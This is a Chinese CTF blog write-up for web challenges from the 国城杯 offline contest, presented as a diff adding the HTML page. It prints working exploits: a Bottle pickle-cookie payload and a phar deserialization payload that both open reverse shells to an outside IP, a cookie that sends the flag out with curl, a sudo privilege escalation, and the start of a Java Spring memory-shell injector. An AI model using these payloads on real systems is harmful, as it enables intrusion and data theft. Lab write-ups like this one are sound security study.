@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这应该是我离各位大佬们（物理上）最近的一次。 AWDP 抽象树那题骗的分。不出来说了，招骂。 Mountain 黑盒，进去看源码。 很容易想到有display路由。进去之后同样看源码 根据提示Get fuzz一下出photo参数。传参可以读取图片。 显然这里有个任意文件读。尝试读取&#x2F;etc&#x2F;pass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="国城杯 线下赛 web wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-12-22-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="这应该是我离各位大佬们（物理上）最近的一次。 AWDP 抽象树那题骗的分。不出来说了，招骂。 Mountain 黑盒，进去看源码。 很容易想到有display路由。进去之后同样看源码 根据提示Get fuzz一下出photo参数。传参可以读取图片。 显然这里有个任意文件读。尝试读取&#x2F;etc&#x2F;pass">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18622173/13.png">
+<meta property="article:published_time" content="2024-12-22T07:56:00.000Z">
+<meta property="article:modified_time" content="2024-12-22T07:56:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18622173/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>国城杯 线下赛 web wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-01-01-ctfshow-2025-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-12-15-cn-fnstctf-web/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-12-22-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-12-22-web-wp/&text=国城杯 线下赛 web wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-12-22-web-wp/&is_video=false&description=国城杯 线下赛 web wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=国城杯 线下赛 web wp&body=Check out this article: https://lamentxu.top/posts/2024-12-22-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-12-22-web-wp/&title=国城杯 线下赛 web wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-12-22-web-wp/&name=国城杯 线下赛 web wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-12-22-web-wp/&t=国城杯 线下赛 web wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mountain"><span class="toc-number">1.</span> <span class="toc-text">Mountain</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%BF%A1%E6%81%AF%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">图片信息查看器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-zhuawa"><span class="toc-number">3.</span> <span class="toc-text">ez_zhuawa</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AWDP-chemistry-industry"><span class="toc-number">4.</span> <span class="toc-text">AWDP-chemistry_industry</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB"><span class="toc-number">4.1.</span> <span class="toc-text">攻</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2"><span class="toc-number">4.2.</span> <span class="toc-text">防</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        国城杯 线下赛 web wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-22T07:56:00.000Z" class="dt-published" itemprop="datePublished">2024-12-22</time>
+        
+        (Updated: <time datetime="2024-12-22T07:56:00.000Z" class="dt-updated" itemprop="dateModified">2024-12-22</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>这应该是我离各位大佬们（物理上）最近的一次。</p>
+<p>AWDP 抽象树那题骗的分。不出来说了，招骂。</p>
+<h1 id="Mountain"><a href="#Mountain" class="headerlink" title="Mountain"></a>Mountain</h1><p>黑盒，进去看源码。</p>
+<p><img src="/images/migrated/18622173/01.png"></p>
+<p>很容易想到有display路由。进去之后同样看源码</p>
+<p><img src="/images/migrated/18622173/02.png"></p>
+<p>根据提示Get fuzz一下出photo参数。传参可以读取图片。</p>
+<p><img src="/images/migrated/18622173/03.png"></p>
+<p>显然这里有个任意文件读。尝试读取&#x2F;etc&#x2F;passwd（一开始还想着路径穿越，发现..&#x2F;直接给禁止了，急哭了，后来发现喵的一个&#x2F;就可以回根目录）</p>
+<p><img src="/images/migrated/18622173/04.png"></p>
+<p>app.py路径未知。先尝试读进程文件&#x2F;proc&#x2F;self&#x2F;cmdline。发现self被waf了，读&#x2F;proc&#x2F;1&#x2F;cmdline</p>
+<p><img src="/images/migrated/18622173/05.png"></p>
+<p>读&#x2F;appppp&#x2F;app.py出源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from bottle import Bottle, route, run, template, request, response</span><br><span class="line">from config.D0g3_GC import Mountain</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">messages = []</span><br><span class="line"></span><br><span class="line">@route(&quot;/&quot;)</span><br><span class="line">def home():</span><br><span class="line">    return template(&quot;index&quot;)</span><br><span class="line"></span><br><span class="line">@route(&quot;/hello&quot;)</span><br><span class="line">def hello_world():</span><br><span class="line">    try:</span><br><span class="line">        session = request.get_cookie(&quot;name&quot;, secret=Mountain)</span><br><span class="line">        if not session or session[&quot;name&quot;] == &quot;guest&quot;:</span><br><span class="line">            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;</span><br><span class="line">            response.set_cookie(&quot;name&quot;, session, secret=Mountain)</span><br><span class="line">            return template(&quot;guest&quot;, name=session[&quot;name&quot;])</span><br><span class="line">        if session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line">            return template(&quot;admin&quot;, name=session[&quot;name&quot;])</span><br><span class="line">    except:</span><br><span class="line">        return &quot;hacker!!! I&#x27;ve caught you&quot;</span><br><span class="line"></span><br><span class="line">@route(&quot;/display&quot;)</span><br><span class="line">def get_image():</span><br><span class="line">    photo = request.query.get(&#x27;photo&#x27;)</span><br><span class="line">    if photo is None:</span><br><span class="line">        return template(&#x27;display&#x27;)</span><br><span class="line">    if re.search(&quot;^../|environ|self&quot;, photo):</span><br><span class="line">        return &quot;Hacker!!! I&#x27;ll catch you no matter what you do!!!&quot;</span><br><span class="line">    requested_path = os.path.join(os.getcwd(), &quot;picture&quot;, photo)</span><br><span class="line">    try:</span><br><span class="line">        if photo.endswith(&#x27;.png&#x27;):</span><br><span class="line">            default_png_path = &quot;/appppp/picture/&quot;</span><br><span class="line">            pngrequested_path = default_png_path+photo</span><br><span class="line">            with open(pngrequested_path, &#x27;rb&#x27;) as f:</span><br><span class="line">                tfile = f.read()</span><br><span class="line">            response.content_type = &#x27;image/png&#x27;</span><br><span class="line">        else:</span><br><span class="line">            with open(requested_path) as f:</span><br><span class="line">                tfile = f.read()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;you have some errors, continue to try again&quot;</span><br><span class="line">    return tfile</span><br><span class="line"></span><br><span class="line">@route(&quot;/admin&quot;)</span><br><span class="line">def admin():</span><br><span class="line">    session = request.get_cookie(&quot;name&quot;, secret=Mountain)</span><br><span class="line">    if session and session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line">        return template(&quot;administator&quot;, messages=messages)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;No permission!!!!&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=&quot;0.0.0.0&quot;, port=8089)</span><br></pre></td></tr></table></figure>
+
+<p>注意到from config.D0g3_GC import Mountain，读取&#x2F;appppp&#x2F;config&#x2F;D0g3_GC.py</p>
+<p><img src="/images/migrated/18622173/06.png"></p>
+<p>得到密钥<code>Mountain=&quot;M0UNTA1ND0G3GCYYDSP0EM5S20I314Y0UARE50SMAR7&quot;</code>，尝试通过密钥伪造admin，可以伪造进去，然并卵。得到一个空的message。急哭了。</p>
+<p>去网上搜bottle的源码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bottlepy/bottle/blob/master/bottle.py#L1161">https://github.com/bottlepy/bottle/blob/master/bottle.py#L1161</a></p>
+<p>尝试SSTI（bushi），发现里面根本就是套jinja2的模板实现的，完全搞不了。</p>
+<p>注意到get_cookie函数</p>
+<p><img src="/images/migrated/18622173/07.png"></p>
+<p>是pickle！我们有救了。</p>
+<p>可以看到，bootle对cookie的处理很不安全。直接验证了一下签名就进pickle反序列化了。这里我们有密钥，可以伪造签名。</p>
+<p>编写exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from bottle import cookie_encode</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">secret = &quot;M0UNTA1ND0G3GCYYDSP0EM5S20I314Y0UARE50SMAR7&quot;</span><br><span class="line"></span><br><span class="line">class Test:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.XX.XX.XX/2333 0&gt;&amp;1&quot;&#x27;)&quot;&quot;&quot;,))</span><br><span class="line"></span><br><span class="line">exp = cookie_encode(</span><br><span class="line">    (&#x27;session&#x27;, &#123;&quot;name&quot;: [Test()]&#125;),</span><br><span class="line">    secret</span><br><span class="line">)</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure>
+
+<p>直接对着hello路由里的get_cookie打就完了（admin里那个也可以）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name=!YOs9lZJn4qOib+WpoHCztLgm2CL6LkuaM1DoDAjVaw8=?gAWViwAAAAAAAACMB3Nlc3Npb26UfZSMBG5hbWWUXZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIxWX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgMTAxLjQzLjQ4LjE5OToyMzMzL2BjYXQgL2ZsYWcvVHJ1ZV9mMWFnX0gzcmUxMXxiYXNlNjRgJymUhZRSlGFzhpQu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18622173/08.png"></p>
+<p><strong>D0g3xGC{e1a6ad26-4eba-4c4f-acac-9026385a1c4f}</strong></p>
+<h1 id="图片信息查看器"><a href="#图片信息查看器" class="headerlink" title="图片信息查看器"></a>图片信息查看器</h1><p>一个登录界面，无admin账户。</p>
+<p><img src="/images/migrated/18622173/09.png"></p>
+<p>图片上传是后缀白名单，但只检测了文件头。还有个读取的功能，还有个owner id（调用了fileowner()）。想到phar反序列化</p>
+<p>对于php实现的读取功能来说，我就只会一个oracle泄露（（（直接脚本跑。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
+<p>发现能正常跑出来&#x2F;etc&#x2F;passwd。无&#x2F;flag。先把源码跑出来</p>
+<p>读trans1t.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;name&#x27;]))&#123;</span><br><span class="line">    $name = $_POST[&#x27;name&#x27;];</span><br><span class="line">    $exception=new B($name);</span><br><span class="line">    $exception-&gt;greet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现有class.php，越来越像phar了</p>
+<p>读class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class backdoor&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        system($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function __construct($name)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    function greet()&#123;</span><br><span class="line">        echo &quot;&lt;h3&gt;hello &quot; . $this-&gt;name.&quot;&lt;/h3&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo &quot;&lt;a href=&#x27;chal13nge.php&#x27; class=&#x27;link-button&#x27;&gt;欢迎来到挑战，点击挑战&lt;/a&gt;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;!--There&#x27;s something in the hI3t.php--&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>确诊phar反序列化。构造phar：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class backdoor</span><br><span class="line">&#123;</span><br><span class="line">    public $cmd = &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.XX.XX.XX/2333 0&gt;&amp;1&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        system($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 后缀必须为phar</span><br><span class="line">$phar = new Phar(&quot;evil.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">// 设置 stubb</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$o = new backdoor();</span><br><span class="line">/**</span><br><span class="line"> * 将自定义的 meta-data 存入 manifest</span><br><span class="line"> * 这个函数需要在php.ini中修改 phar.readonly 为 Off</span><br><span class="line"> * 否则的话会抛出 </span><br><span class="line"> * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly </span><br><span class="line"> * 异常.</span><br><span class="line"> */</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">// 添加需压缩的文件</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>改后缀为gif。上传，获取图片路径那里传<code>phar://uploads/evil.gif/test.txt</code></p>
+<p>弹到shell。</p>
+<p><img src="/images/migrated/18622173/10.png"></p>
+<p>读flag.sh，发现flag在&#x2F;root&#x2F;flag里。（套题去死）</p>
+<p>提权，看sudo -l</p>
+<p><img src="/images/migrated/18622173/11.png"></p>
+<p>发现有root权限的&#x2F;tmp&#x2F;rootscripts&#x2F;check.sh，读取&#x2F;tmp&#x2F;rootscripts&#x2F;check.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line">$&#123;1&#125;/run.sh</span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;tmp下创建run.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;cat /root/flag&quot; &gt; /tmp/run.sh</span><br></pre></td></tr></table></figure>
+
+<p>赋予执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /tmp/run.sh</span><br></pre></td></tr></table></figure>
+
+<p>利用高权限脚本sudo读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /tmp/rootscripts/check.sh &quot;/tmp&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18622173/12.png"></p>
+<p><strong>D0g3xGC{2014887f-98fc-4947-8a6e-8e2f0d135ea4}</strong></p>
+<h1 id="ez-zhuawa"><a href="#ez-zhuawa" class="headerlink" title="ez_zhuawa"></a>ez_zhuawa</h1><p>这题不会。线下真实出题人拿的POC，先贴这。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line">import org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"></span><br><span class="line">public class inject extends AbstractTranslet&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line">            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);</span><br><span class="line"></span><br><span class="line">            String className = &quot;com.example.spring.magicInterceptor&quot;;</span><br><span class="line">            //加载com.example.spring.magicInterceptor类的字节码</span><br><span class="line">            String b64 = 